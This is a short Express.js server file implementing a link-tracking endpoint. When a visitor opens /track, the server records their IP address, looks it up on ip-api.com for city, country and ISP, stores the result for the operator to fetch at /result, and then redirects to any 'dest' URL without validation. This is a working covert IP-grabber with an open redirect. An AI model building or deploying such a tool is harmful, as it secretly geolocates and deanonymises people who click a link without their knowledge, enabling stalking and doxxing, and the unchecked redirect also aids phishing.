const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

let lastData = null;

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/track', async (req, res) => {
  const { dest } = req.query;
  if (!dest) return res.status(400).send('Missing dest parameter');

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

  let geo = {};
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    geo = {
      city: response.data.city || 'Unknown',
      country: response.data.country || 'Unknown',
      isp: response.data.isp || 'Unknown'
    };
  } catch (e) {
    console.error('Geo error:', e.message);
  }

  lastData = {
    ip,
    city: geo.city,
    country: geo.country,
    isp: geo.isp,
    timestamp: new Date().toISOString()
  };

  res.redirect(dest);
});

app.get('/result', (req, res) => {
  res.json(lastData);
});

app.post('/clear', (req, res) => {
  lastData = null;
  res.sendStatus(200);
});

module.exports = app;
